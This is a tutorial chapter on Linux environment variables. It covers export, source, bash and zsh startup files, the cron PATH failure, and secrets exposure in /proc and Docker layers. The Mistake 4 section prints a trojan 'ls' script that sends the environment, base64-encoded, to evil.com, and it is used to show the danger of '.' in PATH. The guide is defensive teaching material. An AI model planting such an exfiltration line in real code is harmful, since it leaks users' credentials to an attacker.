# 14 — Environment Variables

## ELI5 — The Simple Analogy

Every person in a family carries a **backpack** of sticky notes.

- When a parent has a child, the child gets a **photocopy** of the parent's backpack. Same notes, brand new backpack.
- The child can scribble on their notes, tear them up, add new ones. **The parent's backpack never changes.** There is no string running back up.
- Some notes the parent keeps in a **pocket** instead. Pocket notes are private — the child never gets a copy. Moving a note from pocket to backpack is called `export`.

That's the environment. **Copy-down, never copy-up.** Every confusing thing in this topic — why `export` in a subshell does nothing to your shell, why you must `source ~/.bashrc` instead of running it, why editing `.bashrc` doesn't change the terminal you already have open, why a systemd service ignores a new `Environment=` until you restart it — falls out of that one fact.

---

## Where This Lives in the Linux Stack

```
Hardware
  └── KERNEL — at exec() it copies the env block into the new process's memory,
       │       above the stack. Exposes it read-only at /proc/PID/environ.
       └── System Calls
            │   execve(path, argv[], envp[])   ◀◀◀ THIS TOPIC IS THE 3rd ARGUMENT
            │                         ^^^^^^
            │   That NULL-terminated array of "KEY=VALUE" strings IS the environment.
            └── C Library (glibc) — getenv() / setenv() / the global `char **environ`
                 │                   Node's process.env is built by walking `environ`.
                 └── SHELL (bash/zsh)   ◀◀◀ AND ALSO HERE
                      │   Keeps ONE variable table, with an EXPORT FLAG per row.
                      │   Builds envp[] from the flagged rows right before exec().
                      │   Reads .bashrc/.bash_profile to populate them.
                      └── Commands (node, npm, psql — everything calls getenv())
```

Environment variables straddle two layers, and that's exactly why they confuse people. At the **syscall** layer they're a dumb array of strings handed to a new process. At the **shell** layer they're bookkeeping that decides which of your variables get onto that array.

---

## What Is This?

The environment is a **NULL-terminated array of `char *` strings, each of the form `KEY=VALUE`**, passed as the third argument of `execve()`. That's the whole thing. Not a database, not a service, not a file — a block of bytes copied into a process's memory when it starts.

Each process gets its **own private copy** at exec time. It may modify that copy freely, and children it later spawns inherit the modifications — but nothing ever propagates back to its parent.

---

## Why Does This Matter for a Backend Developer?

| If you don't understand this... | This will happen... |
|---|---|
| Inheritance is one-directional | You'll run `./setenv.sh` expecting your `PATH` to change, and be baffled when nothing does |
| Shell vars ≠ environment vars | Your Node app gets `undefined` for `process.env.DB_HOST` even though `echo $DB_HOST` printed it fine |
| Non-interactive shells read NO startup files | Your cron job dies with `node: command not found` at 3am — but works when you SSH in and run it by hand |
| `env -i` | You'll never reproduce the cron/systemd failure locally, because your shell is "helpfully" polluted |
| The environment is readable per-user | You'll `export DB_PASSWORD=hunter2` and leave it in `~/.bash_history`, `/proc/PID/environ`, and `ps e` |
| Docker `ENV` writes an image layer | Your npm token ships to the registry inside the image; `docker history` shows it to everyone |
| `SHELL` is your *login* shell | You'll edit `.bashrc` for an hour while actually standing in zsh |

---

## The Physical Reality

When the kernel `exec()`s a program it builds a fresh address space and lays the strings at the **top** of the user stack:

```
             HIGH ADDRESSES
 ┌─────────────────────────────────────────────────────┐
 │ ENVIRONMENT STRINGS (raw bytes, each NUL-terminated)│
 │   "PATH=/usr/local/bin:/usr/bin:/bin\0"             │
 │   "HOME=/home/deploy\0"  "NODE_ENV=production\0"    │
 ├─────────────────────────────────────────────────────┤
 │ ARGUMENT STRINGS:  "node\0"  "server.js\0"          │
 ├─────────────────────────────────────────────────────┤
 │ envp[] → [ptr, ptr, ptr, NULL]  ← this IS char **environ
 │ argv[] → [ptr, ptr, NULL]       argc                │
 ├─────────────────────────────────────────────────────┤
 │ ▼ C stack grows DOWN   ...   ▲ heap grows UP        │
 │ .text / .data / .bss   (the node binary itself)     │
 └─────────────────────────────────────────────────────┘
             LOW ADDRESSES
```

1. **It's finite.** The kernel caps argv+envp combined (1/4 of the stack rlimit) and each single string at 128 KB (`MAX_ARG_STRLEN`). Exceed it and `execve()` returns `E2BIG` — the same limit behind `argument list too long`.
2. **It's per-process, in memory.** No file on disk holds "the environment." `/proc/PID/environ` is a *window the kernel opens onto that memory*, not a real file.
3. **Everything is a string.** No types, no nesting. `PORT=3000` is four characters — which is why `process.env.PORT + 1` in Node gives you `"30001"`.

```bash
# PROVE IT: the environment is literally NUL-separated KEY=VALUE bytes in memory
cat /proc/self/environ | tr '\0' '\n'      # SHELL=/bin/bash, HOME=/home/deploy, ...
cat /proc/self/environ | od -c | head -3   # see the actual \0 separators between entries

# PROVE IT: you can read the environment of any RUNNING process you own
strings /proc/$(pgrep -f "node server.js" | head -1)/environ
# NODE_ENV=production
# DATABASE_URL=postgres://app:s3cret@db.internal:5432/prod   ← yes, really
```

**macOS note:** there is no `/proc` on macOS. Run every `/proc` command here on Linux (a server, or `docker run --rm -it ubuntu:22.04 bash`). On macOS, `ps eww -p PID` shows a process's environment.

---

## How It Works — Step by Step

```
COMMAND: NODE_ENV=production node server.js

SHELL PARSES: a word containing '=' BEFORE the command name
              → a "prepended assignment": a one-shot env var, for this exec only
SHELL DOES:   fork()                                — clone itself
              (in the child) build envp[] = copy of the shell's EXPORTED vars
                                          + "NODE_ENV=production"
              execve("/usr/bin/node", ["node","server.js"], envp)
KERNEL DOES:  wipes the child's address space; maps the node ELF + dynamic linker;
              copies the argv and envp STRINGS to the top of the new stack; builds
              the envp[] pointer array; jumps to the entry point
LIBC DOES:    the C runtime sets the global `char **environ = envp` before main()
NODE DOES:    walks environ, splits each string at the FIRST '=', builds process.env
              → process.env.NODE_ENV === "production"   ✅
AFTER EXIT:   the parent shell's NODE_ENV is UNCHANGED.  echo "[$NODE_ENV]"  →  []
```

### The shell's variable table — and the one-way door

Bash keeps **one** table, and every row carries an **export flag**:

```
  ┌──────────┬────────────────┬───────────┐        ┌──────────────────┐
  │ NAME     │ VALUE          │ EXPORTED? │        │ YOUR SHELL  4210 │
  ├──────────┼────────────────┼───────────┤        └────────┬─────────┘
  │ PATH     │ /usr/bin:/bin  │   YES ✅  │            fork()│ (child gets a COPY)
  │ NODE_ENV │ production     │   YES ✅  │                  ▼
  │ tmpfile  │ /tmp/build.log │   no  ❌  │        ┌──────────────────┐
  │ PS1      │ \u@\h:\w\$     │   no  ❌  │        │ CHILD       4288 │
  │ i        │ 7              │   no  ❌  │        │ export FOO=bar ✅│
  └──────────┴────────────────┴───────────┘        └────────┬─────────┘
    at exec, envp[] is built from ONLY the YES rows   exit()│ memory freed
                                                            ▼
                                              ✗ NOTHING TRAVELS BACK UP ✗
                                              The parent's FOO is still unset.
```

**There is no syscall that writes into another process's environment.** It isn't a permissions problem — the API does not exist. Every "set my parent shell's variable" trick you find online is either a lie or a `source`.

`export X` doesn't create anything — **it flips the flag on a row** (creating the row first if needed). That is the entire mechanism.

| | Effect |
|---|---|
| `X=1` | creates row X, flag = **no**. Children never see it |
| `export X` / `export X=1` | flips the flag to **YES**. Children see it |
| `export -n X` | flag back to no, **keeps the value** (usable here; children stop seeing it) |
| `unset X` | deletes the row entirely |

---

## Shell Variables vs Environment Variables

The single most-missed idea in the topic. Run this **right now**:

```bash
X=1
echo "this shell: [$X]"          # [1]   ← the shell can see it
bash -c 'echo "child: [$X]"'     # []    ← the child CANNOT
env | grep '^X='                 # (nothing — X is not in the environment)

export X=1
bash -c 'echo "child: [$X]"'     # [1]   ← inherited ✅
env | grep '^X='                 # X=1

export -n X
echo "this shell: [$X]"          # [1]   ← still usable here
bash -c 'echo "child: [$X]"'     # []    ← child lost it again
```

**Why this bites you:** you add `DB_HOST=db.internal` near the top of a deploy script, then run `node server.js` further down. `echo $DB_HOST` inside the script works fine. `process.env.DB_HOST` inside Node is `undefined`. The variable existed in the shell process; it was never on the `envp[]` array handed to `node`. **Fix: `export DB_HOST=db.internal`.**

| Form | Shell var? | In environment? | Scope | Use for |
|---|---|---|---|---|
| `X=1` | ✅ | ❌ | this shell only | loop counters, temp paths, script internals |
| `export X=1` | ✅ | ✅ | this shell + all future children | config your app needs |
| `X=1 command` | ❌ | ✅ (for `command` only) | exactly one process | one-off overrides |

The third form is the cleanest thing in the topic: it sets the variable for **that one process** and leaves your shell untouched — no export, no cleanup, no pollution.

```bash
NODE_ENV=production node app.js
DEBUG=express:* node app.js                           # debug logging for ONE run
LC_ALL=C sort data.txt                                # byte-order sort for ONE command
NODE_OPTIONS=--max-old-space-size=4096 npm run build  # more heap for ONE build
```

---

## `source` — The Only Escape Hatch

```
  ./script.sh                      source ./script.sh   (or  . ./script.sh)
  ───────────                      ────────────────────
  fork() → new process             NO FORK. NO EXEC.
  exec() → becomes bash            YOUR shell opens the file and runs the lines
  runs the lines, then exits       as if you had typed them.
  → its variables:  GONE           → its variables: STAY.  functions: STAY.
  → its cd:         GONE           → its cd: CHANGES YOUR DIRECTORY.
    (parent's cwd untouched)       → its `exit`: EXITS YOUR SHELL. (use `return`!)
```

This is why `source ~/.bashrc` reloads your config while `./.bashrc` does nothing visible; why `nvm`, `pyenv`, and `venv/bin/activate` **must** be sourced (they mutate `PATH` in *your* shell); and why a "cd to the project root" helper must be a shell function or a sourced file, never an executable script.

```bash
# PROVE IT: source runs in the current shell — no fork
echo 'FOO=bar; cd /tmp' > /tmp/t.sh
bash   /tmp/t.sh ; echo "after exec:   FOO=[$FOO] PWD=$PWD"   # FOO=[]    PWD=/home/deploy
source /tmp/t.sh ; echo "after source: FOO=[$FOO] PWD=$PWD"   # FOO=[bar] PWD=/tmp
```

---

## The Variables That Actually Matter

| Variable | What it really is | The gotcha |
|---|---|---|
| `PATH` | Colon-separated dirs the shell searches, **left to right, first match wins** | Order matters — a stale `/usr/local/bin/node` shadows your nvm node. Never put `.` in it |
| `HOME` | Your home dir. `~` is expanded *by the shell* into `$HOME` | In a container running as an arbitrary UID, `HOME` may be `/` — npm then writes `/.npm` and gets EACCES |
| `USER` / `LOGNAME` | Your username, set at login | **Not set** under cron or in many containers. Use `id -un` when you need it reliably |
| `SHELL` | Your **login shell from `/etc/passwd`** — NOT the shell you're running | Says `/bin/bash` while you stand in zsh. Truth: `ps -p $$ -o comm=` |
| `PWD` / `OLDPWD` | Current and previous dir; `cd -` jumps to `$OLDPWD` | Maintained by the shell. Kernel truth: `readlink /proc/self/cwd` |
| `LANG` / `LC_ALL` | Locale. `LC_ALL` **overrides everything** | Changes `sort` order and `[a-z]` ranges — see below |
| `TERM` | Terminal type (`xterm-256color`) | SSH to a box whose terminfo lacks your `TERM` → `vim` and `clear` break |
| `EDITOR` / `VISUAL` | Editor for `git commit`, `crontab -e`, `visudo`, Ctrl-X Ctrl-E | Unset on servers → you land in `nano`, or worse, `ed` |
| `TZ` | Timezone for **this process** | `TZ=UTC node app.js` gives sane logs without touching the system clock |
| `PS1` | Your prompt. A **shell** variable, not exported | Exporting it does nothing — children build their own prompt |
| `IFS` | Internal Field Separator — how the shell splits unquoted expansions (default: space, tab, newline) | `IFS=$'\n'` is how you loop over filenames containing spaces |
| `LD_LIBRARY_PATH` | Extra dirs the dynamic linker searches for `.so` files | Deliberately ignored for setuid binaries — it's an attack vector |
| `TMPDIR` | Where temp files go — honoured by `mktemp` and Node's `os.tmpdir()` | Point it at a big disk when `/tmp` is a small tmpfs and your build dies with ENOSPC |
| `NODE_ENV` | **Not magic — Node ignores it.** Express/webpack/**npm** read it | `npm ci` with `NODE_ENV=production` **skips devDependencies**. A real Dockerfile trap |
| `PORT` | A convention, not a standard: `app.listen(process.env.PORT \|\| 3000)` | It's a **string** — some libs need `Number(...)` |
| `DATABASE_URL` | A connection string | Visible in `/proc/PID/environ` and `ps e`. See Secrets below |
| `NODE_OPTIONS` | Flags injected into every node process | `--max-old-space-size=2048` is the real fix for `FATAL ERROR: Reached heap limit — JavaScript heap out of memory` on a box with more RAM than V8's default heap |
| `NPM_TOKEN` | Read from `.npmrc` as `//registry.npmjs.org/:_authToken=${NPM_TOKEN}` | Must **never** land in a Docker layer |

**The locale bug — a real one:**

```bash
printf 'a\nB\nc\n' > /tmp/g.txt
LC_ALL=en_US.UTF-8 sort /tmp/g.txt    # a  B  c   ← dictionary order, ignores case
LC_ALL=C           sort /tmp/g.txt    # B  a  c   ← BYTE order: 'B'=0x42 < 'a'=0x61
```

Your laptop is `en_US.UTF-8`; the CI container is `C` (or unset, which *means* `C`). The same `sort | uniq` pipeline produces **different output on each**, and your "deterministic" checksum or diff breaks. **Fix: pin `LC_ALL=C`** in any script whose output must be byte-stable. `C` is fast, byte-ordered, and identical everywhere.

---

## STARTUP FILES — The Thing Everyone Gets Wrong

Two **independent** yes/no questions decide which files bash reads. That they're independent is the part people miss.

1. **LOGIN shell?** Started by a login process: `ssh host`, TTY login, `su -`, `bash -l`, or a new macOS Terminal window.
2. **INTERACTIVE?** Is there a human at a prompt? Not `bash script.sh`, not `ssh host 'cmd'`, not cron.

```
                    ┌───────────────────────────┐
                    │ bash starts. Which files? │
                    └─────────────┬─────────────┘
                        ┌─────────▼─────────┐
                        │ Is it INTERACTIVE?│  (a prompt; no script given)
                        └──┬─────────────┬──┘
                        NO │             │ YES
         ┌─────────────────▼──┐      ┌───▼────────────────────┐
         │ NON-INTERACTIVE    │      │ Is it a LOGIN shell?   │
         │  bash script.sh    │      └──┬──────────────────┬──┘
         │  cron jobs         │     YES │                  │ NO
         │  ssh host 'cmd'    │         ▼                  ▼
         │  systemd ExecStart │  ┌──────────────┐  ┌───────────────┐
         │  Docker RUN / CMD  │  │ LOGIN        │  │ NON-LOGIN     │
         │                    │  ├──────────────┤  ├───────────────┤
         │ READS: NOTHING.    │  │ /etc/profile │  │/etc/bash.bashrc
         │ Not .bashrc.       │  │      ↓       │  │      ↓        │
         │ Not .profile.      │  │ the FIRST of:│  │ ~/.bashrc     │
         │ NOTHING.           │  │ ~/.bash_prof.│  │               │
         │                    │  │ ~/.bash_login│  │ (a new tab on │
         │ ⚠ CRON DIES HERE ⚠ │  │ ~/.profile   │  │  Linux; `bash`│
         └────────────────────┘  │ ⚠ ONLY THE   │  │  typed inside │
                                 │   FIRST ⚠    │  │  bash)        │
                                 │ exit: ~/.bash_logout            │
                                 └──────────────┘  └───────────────┘
```

**The three rules:**

1. **LOGIN → profile files. INTERACTIVE-NON-LOGIN → bashrc. NON-INTERACTIVE → NOTHING.**
2. Of `~/.bash_profile`, `~/.bash_login`, `~/.profile`, bash reads **exactly one — the first that exists.** If you have both `.bash_profile` and `.profile`, your `.profile` is **dead code.** This silently eats hours.
3. Which is why nearly every `~/.bash_profile` on earth contains this bridge:
   ```bash
   [[ -f ~/.bashrc ]] && . ~/.bashrc   # a login shell won't read it — pull it in by hand
   ```
   Without the bridge your aliases work in a new terminal tab (non-login → reads `.bashrc`) but **vanish over SSH** (login → reads only `.bash_profile`).

| Put in `~/.bash_profile` | Put in `~/.bashrc` |
|---|---|
| `export PATH=...`, `export EDITOR=vim`, ssh-agent startup | `alias ll='ls -la'`, shell functions, `PS1=...`, `shopt`/`set -o` |
| Anything **exported** — children inherit it, so once per login is enough | Anything **not** inherited by children, so it must be re-created in every shell |

**Aliases and prompts are not exported.** They exist only in the shell that defined them — which is exactly why they belong in `.bashrc`, the file that runs for *every* interactive shell.

### zsh — because you're on macOS

| File | When zsh reads it |
|---|---|
| `~/.zshenv` | **EVERY** zsh — login, interactive, scripts, all of them. Keep it tiny: env vars only |
| `~/.zprofile` | login shells only — the `.bash_profile` analogue |
| `~/.zshrc` | interactive shells — the `.bashrc` analogue (aliases, prompt, completions) |
| `~/.zlogin` / `~/.zlogout` | login (after `.zshrc`) / logout. Rarely used |

**The trap:** on **macOS**, Terminal.app and iTerm2 run a **login shell for every new window/tab**. On **Linux**, a new terminal tab (or `docker exec -it ... bash`) runs a **non-login interactive** shell.

```
  macOS new window  →  LOGIN + INTERACTIVE    →  .zprofile then .zshrc
  Linux new tab     →  NON-login INTERACTIVE  →  .bashrc only
  ssh linuxserver   →  LOGIN + INTERACTIVE    →  .bash_profile only
                                                 (which had better source .bashrc)
```

Same dotfiles, three behaviours. This is precisely why your `PATH` tweak "works on my Mac" and evaporates on the server: macOS papers over the `.bash_profile`/`.bashrc` split by always running a login shell. Linux does not.

---

## THE CRON BUG — The Classic Production Failure

This will happen to you. Probably this year. Your crontab runs `sync.sh`; the log says `node: command not found`; the script runs perfectly when you SSH in and execute it by hand.

```
  YOU, over SSH:                    CRON, at 03:00:
  ──────────────                    ───────────────
  sshd forks                        crond forks
    ↓                                 ↓
  LOGIN + INTERACTIVE bash          builds a MINIMAL environment BY HAND:
    ↓                                 PATH=/usr/bin:/bin   ← that is IT
  reads /etc/profile                  SHELL=/bin/sh   HOME=/home/deploy
  reads ~/.bash_profile               LOGNAME=deploy
    → sources ~/.bashrc               (no LANG, no USER, no nvm, nothing)
      → sources ~/.nvm/nvm.sh         ↓
        → PATH gains                execs /bin/sh -c '/home/deploy/scripts/sync.sh'
          ~/.nvm/versions/.../bin     ↓
    ↓                               NON-INTERACTIVE, NON-LOGIN shell
  `node` → FOUND ✅                   → reads NO startup files. None.
                                      ↓
                                    `node` → searched /usr/bin, /bin → NOT FOUND ❌
```

Your node lives in `~/.nvm/versions/node/v18.19.0/bin/node`. That directory reached `PATH` because `.bashrc` sourced `nvm.sh`. **Cron never ran `.bashrc`.** Nothing is broken — the environment is simply different, and cron's is nearly empty.

```bash
# DIAGNOSE: capture cron's real environment. Add this line, wait a minute, read the file.
* * * * * env > /tmp/cron-env.txt
# SHELL=/bin/sh  PWD=/home/deploy  LOGNAME=deploy  HOME=/home/deploy
# PATH=/usr/bin:/bin          ← THERE IT IS. Five variables. That's the whole world.

# REPRODUCE IT NOW, at 2pm, instead of waiting for 3am.  env -i = empty environment.
env -i /bin/sh -c 'node --version'
# /bin/sh: 1: node: not found                         ← the bug, in one line ✅
env -i PATH=/usr/bin:/bin HOME=$HOME /bin/sh -c /home/deploy/scripts/sync.sh
```

**The three fixes, best first:**

```bash
# FIX 1 (best): absolute paths. Nothing inherited, nothing to break.
*/5 * * * * /home/deploy/.nvm/versions/node/v18.19.0/bin/node /srv/app/sync.js

# FIX 2: set PATH at the top of the crontab — crontab supports assignments.
PATH=/home/deploy/.nvm/versions/node/v18.19.0/bin:/usr/local/bin:/usr/bin:/bin
NODE_ENV=production
*/5 * * * * /home/deploy/scripts/sync.sh

# FIX 3: make the SCRIPT build its own environment.
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"    # now PATH has node
```

**Prevention (the habit):** never assume an interactive environment in anything that isn't interactive. Cron, systemd `ExecStart=`, Docker `CMD`, CI runners, and `ssh host 'command'` are **all** non-interactive — none read `.bashrc`. Test each with `env -i`. (Forward-ref: topic **20 — Cron** and topic **22 — systemd** both live and die on this.)

---

## Secrets in the Environment

Env vars are the standard way to pass config to a twelve-factor app. They are **not** a secrets vault. Know the exposure surface:

```bash
export DB_PASSWORD='hunter2'
grep DB_PASSWORD ~/.bash_history                     # LEAK 1: plaintext, forever
strings /proc/$(pgrep -f "node server.js")/environ   # LEAK 2: DB_PASSWORD=hunter2 —
#   any process YOU own can read this. So can a malicious npm postinstall. So can root.
ps e -p $(pgrep -f "node server.js")                 # LEAK 3: ps prints the environment
#   8123 ? Ssl 0:04 node server.js NODE_ENV=production DB_PASSWORD=hunter2 ...
#                                    LEAK 4: crash reporters that dump process.env.
```

| Mitigation | Why it works |
|---|---|
| Prefix the command with a **space** (needs `HISTCONTROL=ignorespace`) | ` export DB_PASSWORD=x` never reaches history — topic **15** |
| Secrets in a **`.env` file**, `chmod 600`, `.gitignore`d | The kernel enforces `0600` — only you can read it. Topic **05** callback: `-rw-------` = mode 600 |
| Load with `dotenv`, or `set -a; . ./.env; set +a` | `set -a` auto-exports every assignment; `set +a` turns it back off |
| systemd `EnvironmentFile=/etc/myapp.env`, `chmod 640 root:myapp` | systemd reads it as root; the unit gets the vars; other users can't read the file |
| A real secrets manager (Vault, AWS SM) injecting at runtime | Nothing on disk, short-lived credentials |

**The Docker trap — this one is permanent:**

```dockerfile
# ❌ CATASTROPHIC. ENV writes a LAYER. Layers are immutable and ship with the image.
ENV NPM_TOKEN=npm_abc123...
RUN npm ci
#   Anyone who pulls it runs `docker history --no-trunc myimage` and reads your token.
#   Unsetting it in a LATER layer does NOT remove it — layers stack, they never erase.

# ⚠ ARG is better (not in the final image's ENV) but IS still recorded in the build
#   history/cache for that layer. Not safe for secrets.
ARG NPM_TOKEN

# ✅ BUILD SECRET: mounted as tmpfs, never written to any layer.
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci
#   docker build --secret id=npmrc,src=$HOME/.npmrc .

# ✅ RUNTIME: never baked into the image at all.
#   docker run -e DATABASE_URL="$DATABASE_URL" myimage
#   docker run --env-file ./prod.env myimage
```

| | `ARG` | `ENV` | `docker run -e` / `--env-file` |
|---|---|---|---|
| Available during **build** | ✅ | ✅ | ❌ |
| Available at **runtime** | ❌ | ✅ | ✅ |
| **Baked into the image** | ❌ (but in build history) | ✅ **permanently, in a layer** | ❌ |
| Overridable at `docker run` | ❌ | ✅ (`-e` wins) | — |
| Safe for secrets | ❌ | ❌❌ **never** | ✅ |
| Use for | build knobs (`NODE_VERSION`) | non-secret defaults (`NODE_ENV`, `PORT`) | anything secret or per-environment |

---

## Exact Syntax Breakdown

```
export NODE_ENV=production
│      │        │
│      │        └── VALUE. No spaces around '='.  `X = 1` is a COMMAND named X!
│      └── NAME: [A-Za-z_][A-Za-z0-9_]* — no dashes, no dots. UPPER by convention.
└── a shell BUILTIN, not a program. Flips the export flag so children inherit it.
    It MUST be a builtin — an external program could never modify the shell's
    variable table (the one-way door!).  `type export` → "a shell builtin"
    -n  un-export: keep the value, stop exporting      -p  list all exported vars
```

```
env -i PATH=/usr/bin FOO=bar node app.js
│   │  │                     │
│   │  │                     └── the program to run, with its args
│   │  └── vars to ADD to the (now empty) environment
│   └── -i = --ignore-environment: start from a COMPLETELY EMPTY environment
└── /usr/bin/env — a real BINARY (not a builtin). It modifies ITS OWN environment,
    then exec()s the program. The classic Unix wrapper pattern.
    env  dump the environment    env -u FOO cmd  run cmd without FOO
    env -i cmd   THE cron/systemd debugging tool — reproduce a bare environment
```

```
source ~/.bashrc          .  ~/.bashrc
│      │                  │
│      └── file to read   └── `.` is POSIX; `source` is the bash/zsh spelling. Same thing.
└── BUILTIN. Executes each line IN THE CURRENT SHELL. No fork. No exec. No child.
    That is the entire point. `./file` forks a child that dies, taking everything with it.
```

```
printenv PATH        env | grep '^PATH='        echo "$PATH"
│        │
│        └── optional: print just this ONE var — exits 1 if unset (scriptable!)
└── prints the ENVIRONMENT only, never shell vars. The honest one.

set        shell vars AND env vars AND FUNCTION BODIES — hundreds of lines. Rarely what
           you want.  `set -a` = auto-export everything;  `set -o` = show shell options
declare -x   exported vars only    declare -p X   value + attributes (-x -i -r)
compgen -v   just the NAMES of all shell variables. Clean.

unset FOO    the NAME — no `$`!  `unset $FOO` unsets the var NAMED BY FOO'S VALUE.
             Deletes the row. NOT the same as FOO="":
               unset FOO → doesn't exist.  ${FOO-d} → "d"
               FOO=""    → EXISTS, empty.  ${FOO-d} → ""   (but ${FOO:-d} → "d")
```

---

## Example 1 — Basic

```bash
# ── Inheritance is one-way. Prove it in 60 seconds. ──
GREETING="hello"                              # 1. a plain shell variable
bash -c 'echo "child: [$GREETING]"'           # child: []       ← NOT inherited

export GREETING                               # 2. export → children get a copy
bash -c 'echo "child: [$GREETING]"'           # child: [hello]  ← inherited ✅

# 3. The child changes it. Watch the parent. (Spoiler: nothing happens.)
bash -c 'GREETING="goodbye"; echo "child now: [$GREETING]"'   # child now: [goodbye]
echo "parent still: [$GREETING]"                              # parent still: [hello]
#                                                               ^^^^ THE ONE-WAY DOOR

# 4. One-shot: set it for exactly one command; your shell is untouched.
GREETING="temp" bash -c 'echo "one-shot: [$GREETING]"'        # one-shot: [temp]
echo "parent after: [$GREETING]"                              # parent after: [hello]

# 5. Where does it physically live? In the child's memory, put there by the kernel.
export SECRET_SAUCE="ketchup"
bash -c 'tr "\0" "\n" < /proc/self/environ | grep SECRET'     # SECRET_SAUCE=ketchup

# 6. unset deletes the row. NOT the same as setting it empty.
unset GREETING;  echo "${GREETING-<UNSET>}"           # <UNSET>
GREETING="";     echo "${GREETING-<UNSET>}"           # (empty!) ← it EXISTS, just blank
                 echo "${GREETING:-<EMPTY OR UNSET>}" # <EMPTY OR UNSET>  ← the colon
```

---

## Example 2 — Production Scenario

**02:14.** PagerDuty. The nightly billing sync hasn't run for three nights. You SSH into `api-prod-01`.

```bash
deploy@api-prod-01:~$ tail -3 /var/log/billing-sync.log
/srv/billing/sync.sh: line 4: node: command not found
/srv/billing/sync.sh: line 4: node: command not found
/srv/billing/sync.sh: line 4: node: command not found

deploy@api-prod-01:~$ /srv/billing/sync.sh
[billing] connected to postgres
[billing] synced 1,284 invoices
#  ⚠ Works by hand. Fails from cron. You already know what this is.

deploy@api-prod-01:~$ which node
/home/deploy/.nvm/versions/node/v18.19.0/bin/node
#  ↑ nvm — so PATH got this from .bashrc, which cron never reads.

# Confirm the hypothesis instead of guessing. Reproduce cron's world exactly:
deploy@api-prod-01:~$ env -i PATH=/usr/bin:/bin HOME=/home/deploy /bin/sh -c /srv/billing/sync.sh
/srv/billing/sync.sh: line 4: node: command not found
#  ✅ Reproduced in one command. It's PATH — not the app, not the DB, not the network.
```

Now read the script, and find the *second* bug hiding behind the first:

```bash
deploy@api-prod-01:~$ cat /srv/billing/sync.sh
#!/bin/bash
cd /srv/billing
DATABASE_URL="postgres://billing:pw@db.internal:5432/billing"   # ← NO export!
node sync.js
```

`DATABASE_URL` is a **shell** variable — Node will see `process.env.DATABASE_URL === undefined`. It only "worked" by hand because your *login shell* had already exported it from `~/.bashrc`. Fixing `PATH` alone would have moved the failure to a DB connection error at 2am tomorrow. Fix both now:

```bash
deploy@api-prod-01:~$ cat /srv/billing/sync.sh
#!/usr/bin/env bash
set -euo pipefail                    # fail loudly (topic 13)
cd /srv/billing
set -a                               # auto-export every assignment below
source /srv/billing/.env             # DATABASE_URL=..., NODE_ENV=production
set +a                               # stop auto-exporting
exec /home/deploy/.nvm/versions/node/v18.19.0/bin/node sync.js   # absolute path

deploy@api-prod-01:~$ ls -l /srv/billing/.env
-rw------- 1 deploy deploy 142 Jul 12 02:31 /srv/billing/.env   # mode 600 (topic 05)

deploy@api-prod-01:~$ crontab -l
PATH=/home/deploy/.nvm/versions/node/v18.19.0/bin:/usr/local/bin:/usr/bin:/bin
0 2 * * * /srv/billing/sync.sh >> /var/log/billing-sync.log 2>&1

# Verify the way cron will actually run it — under a stripped environment:
deploy@api-prod-01:~$ env -i HOME=/home/deploy /bin/sh -c /srv/billing/sync.sh
[billing] connected to postgres
[billing] synced 1,284 invoices
#  ✅ Works with an EMPTY environment. Therefore it will work at 2am.
```

**What you just did:** used "non-interactive shells read no startup files" to explain the failure in 30 seconds, used `env -i` to reproduce a 2am bug on demand at 2:20am, and caught a *second* latent bug (a missing `export`) that would have paged you again tomorrow night.

---

## Common Mistakes

### Mistake 1 — Expecting a script to change your shell

**Wrong:** `./setup.sh` (which does `export PATH=...` and `cd /srv/app`) → `echo $PATH` unchanged, `pwd` unchanged. "The script is broken!"
**Right:** `source setup.sh` → both change. ✅

**Root cause (kernel level):** `./setup.sh` forks; the child `execve()`s bash; the child modifies **its own** environment and **its own** cwd (`chdir()` is per-process); the child exits; the kernel frees its memory. Nothing was ever written into the parent's address space — **no syscall exists to do that.** `source` doesn't fork; your own shell reads the lines.

**Prevention:** if a tool must mutate your shell, ship it as a **function** in `.bashrc` or a file to be **sourced**. That's why `nvm`, `pyenv`, and `venv/bin/activate` are all sourced.

---

### Mistake 2 — Forgetting `export`, then blaming Node

**Wrong:** `PORT=8080` then `node server.js` → the app listens on 3000. "`process.env.PORT` is undefined?!"
**Right:** `export PORT=8080` — or cleaner, `PORT=8080 node server.js`.

**Root cause:** the assignment created a row in bash's table with the export flag **off**. When bash built `envp[]` for `execve()`, it skipped that row. `process.env` is built from `environ`, which *is* `envp[]`. The string `PORT=8080` was never there.

**Diagnose:** `bash -c 'echo "[$PORT]"'` from inside the script. Empty output = not exported.

---

### Mistake 3 — Destroying PATH

**Wrong:** `export PATH="/opt/mytool/bin"` → `bash: ls: No such file or directory`. Your shell is a brick, and so is everything you launch from it.
**Right:** `export PATH="/opt/mytool/bin:$PATH"` (prepend — yours wins ties) or `export PATH="$PATH:/opt/mytool/bin"` (append — system binaries win ties).

**Root cause:** `PATH` is the *only* list searched for a bare command name. Overwrite it and every external command becomes unfindable. Builtins (`cd`, `echo`, `export`) still work — which is why the shell doesn't fully die, and you can recover with `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` (or by calling things absolutely: `/bin/ls`).

**Prevention:** never write a bare `PATH=`. Always `"new:$PATH"` or `"$PATH:new"`. Test dotfile edits in a **new** terminal while keeping the old one open as your lifeboat.

---

### Mistake 4 — `.` in PATH (the oldest trap in Unix)

**Wrong:** `export PATH=".:$PATH"` — or, sneakier, an **empty element**: `PATH="/usr/bin::/bin"` and a trailing `PATH="/usr/bin:"` both silently mean "the current directory" too.

```bash
# An attacker (or a careless npm package) drops this into a world-writable dir:
$ cat /tmp/shared/ls
#!/bin/bash
curl -s "https://evil.com/x?e=$(base64 -w0 /proc/self/environ)" &   # steal your env
exec /bin/ls "$@"                                                   # then behave normally

$ cd /tmp/shared && ls        # the most innocent command in Unix
# → PATH matched "." FIRST → ran ./ls → your DATABASE_URL is now on evil.com
# → then it exec'd the real ls, so the output looks completely normal. You notice nothing.
```

**Root cause:** the shell takes the **first** PATH match, left to right. With `.` in the list, *the contents of whatever directory you happen to be standing in become commands.*

**Right:** never put `.` (or an empty element) in `PATH`. Run local things explicitly: `./script.sh`.
**PROVE IT:** `echo "$PATH" | tr ':' '\n' | grep -n '^\.$\|^$'` — any output means you have the hole.

---

### Mistake 5 — Trusting `$SHELL`

